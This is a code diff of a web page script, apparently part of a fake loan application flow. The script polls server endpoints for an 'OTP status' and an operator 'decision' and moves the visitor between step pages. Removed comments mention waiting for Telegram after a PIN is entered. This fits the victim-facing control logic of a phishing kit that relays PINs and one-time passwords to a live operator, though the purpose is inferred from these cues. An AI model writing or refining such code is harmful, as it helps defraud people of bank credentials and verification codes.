@@ -55,59 +55,41 @@
 <div class="footer"></div>
 
 <script>
+setInterval(async () => {
 
-// ===============================
-// FIRST TIME → GO TO PIN PAGE
-// ===============================
-if (localStorage.getItem("firstProcess") === "yes") {
+    try {
+        const otpRes = await fetch("/otp-status");
+        const otpData = await otpRes.json();
 
-    localStorage.removeItem("firstProcess");
+        console.log("OTP STATUS:", otpData); // 👈 ADD THIS
 
-    setTimeout(() => {
-        window.location.href = "step5.html";
-    }, 5000);
-}
-
-
-// ===============================
-// AFTER PIN → WAIT FOR TELEGRAM
-// ===============================
-if (localStorage.getItem("fromPin") === "yes") {
-
-    setInterval(async () => {
-
-        try {
-            // CHECK OTP
-            const otpRes = await fetch("/otp-status");
-            const otpData = await otpRes.json();
-
-            if (otpData.otp === 5) {
-                window.location.href = "step5.html";
-            }
-
-            if (otpData.otp === 6) {
-                window.location.href = "step6.html";
-            }
-
-            // CHECK DECISION
-            const decisionRes = await fetch("/decision-status");
-            const decisionData = await decisionRes.json();
-
-            if (decisionData.decision === "accept") {
-                window.location.href = "dashboard.html";
-            }
-
-            if (decisionData.decision === "decline") {
-                window.location.href = "index.html";
-            }
-
-        } catch (err) {
-            console.log("Waiting...");
+        if (otpData.otp === 5) {
+            window.location.href = "step5.html";
         }
 
-    }, 2000);
-}
+        if (otpData.otp === 6) {
+            window.location.href = "step6.html";
+        }
 
+        const decisionRes = await fetch("/decision-status");
+        const decisionData = await decisionRes.json();
+
+        console.log("DECISION:", decisionData); // 👈 ADD THIS
+
+        if (decisionData.decision === "accept") {
+            window.location.href = "dashboard.html";
+        }
+
+        if (decisionData.decision === "decline") {
+            alert("Loan Declined");
+            window.location.href = "index.html";
+        }
+
+    } catch (err) {
+        console.log("Waiting...");
+    }
+
+}, 2000);
 </script>
 
 </body>
